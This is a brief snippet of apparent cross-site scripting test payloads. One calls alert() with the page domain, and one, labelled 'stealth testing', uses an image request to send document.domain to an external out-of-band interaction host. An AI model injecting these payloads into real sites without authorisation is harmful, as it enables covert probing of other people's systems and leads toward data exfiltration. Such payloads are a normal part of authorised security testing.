// Example payload
alert("XSS ✅ on " + document.domain);

// Or for stealth testing
new Image().src = "https://wdnjvosjkyhkfsmxvovxoq4wsvswtm3id.oast.fun/log?" + document.domain;
